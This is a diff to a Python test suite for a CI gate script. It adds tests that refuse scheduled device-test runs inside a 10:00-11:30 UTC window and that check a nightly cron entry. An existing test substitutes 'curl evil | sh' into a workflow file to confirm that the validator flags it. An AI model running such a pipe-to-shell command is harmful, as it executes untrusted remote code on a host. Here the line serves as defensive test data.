@@ -4,6 +4,7 @@ device_tests.py and publish.py device-open / device-push. Everything Android, Gi
 import ast
 import http.client
 import inspect
+import datetime
 import io
 import json
 import os
@@ -125,6 +126,45 @@ class GateTests(unittest.TestCase):
                 patch("sys.argv", ["gate.py", "--action", "device-tests", "--source-sha", "main"]), \
                 self.assertRaises(GateDenial):
             gate.main()
+
+    def test_a_scheduled_run_never_starts_inside_the_no_device_test_window(self):
+        """Coordinator, 3 Nov: run 41623657138, the schedule GitHub started at 10:58 UTC, ran inside 10:00-11:30."""
+        at = lambda hour, minute: datetime.datetime(2026, 11, 3, hour, minute, tzinfo=datetime.timezone.utc)
+        for hour, minute in ((10, 0), (10, 58), (11, 29)):
+            with self.subTest(at=f"{hour}:{minute:02}"):
+                with self.assertRaises(GateDenial) as denied:
+                    gate.validate_window("device-tests", "schedule", at(hour, minute))
+                self.assertIn("between 10:00 and 11:30 UTC", denied.exception.args[0])
+        def admitted(action, event, when):
+            try:
+                gate.validate_window(action, event, when)
+            except GateDenial as denial:
+                self.fail(f"{action} {event} at {when:%H:%M} was denied: {denial.args[0]}")
+        for hour, minute in ((9, 59), (11, 30), (3, 17), (21, 17)):
+            with self.subTest(at=f"{hour}:{minute:02}"):
+                admitted("device-tests", "schedule", at(hour, minute))
+        admitted("device-tests", DISPATCH, at(10, 30))  # a dispatch is its dispatcher's own call
+        admitted("compile", "schedule", at(10, 30))
+
+    def test_admission_denies_a_scheduled_run_inside_the_window(self):
+        from test_compile_pr import ENVIRONMENT, POLICIES
+        env = {"GITHUB_REPOSITORY": REPO, "GITHUB_REF": MAIN, "GITHUB_EVENT_NAME": "schedule", "GH_TOKEN": "fixture"}
+        inside = datetime.datetime(2026, 11, 3, 10, 58, tzinfo=datetime.timezone.utc)
+        real = gate.validate_window
+        with patch.dict(os.environ, env, clear=True), \
+                patch("gate.get_json", side_effect=lambda path, token: POLICIES if path.endswith("per_page=100")
+                      else dict(ENVIRONMENT, protection_rules=[])) as read, \
+                patch("gate.validate_window", side_effect=lambda action, event: real(action, event, inside)), \
+                patch("sys.argv", ["gate.py", "--action", "device-tests", "--source-sha", "main"]), \
+                self.assertRaises(GateDenial):
+            gate.main()
+        read.assert_not_called()
+
+    def test_the_nightly_schedule_is_set_well_before_the_window(self):
+        """GitHub started it 5 to 8 hours late; at 21:17 UTC those late starts land around 02:30-05:20 UTC."""
+        text = (Path(__file__).resolve().parents[2] / ".github/workflows/device-tests.yml").read_text()
+        self.assertIn('    - cron: "17 21 * * *"\n', text)
+
 
 class MainHeadTests(unittest.TestCase):
     def test_main_resolves_to_main_head_and_is_checked_out_exactly(self):
@@ -2953,7 +2993,7 @@ class WorkflowPinTests(unittest.TestCase):
 
     def test_only_the_encrypted_report_and_the_nightly_schedule(self):
         self.flagged(self.text.replace("may-device-sealed/android.age", "may-device-out"), "hands over something")
-        self.flagged(self.text.replace('"17 3 * * *"', '"*/5 * * * *"'), "one nightly schedule")
+        self.flagged(self.text.replace('"17 21 * * *"', '"*/5 * * * *"'), "one nightly schedule")
         self.flagged(self.text.replace("sudo udevadm trigger --name-match=kvm", "curl evil | sh"), "runs something other")
 
     def test_static_check_runs_it(self):
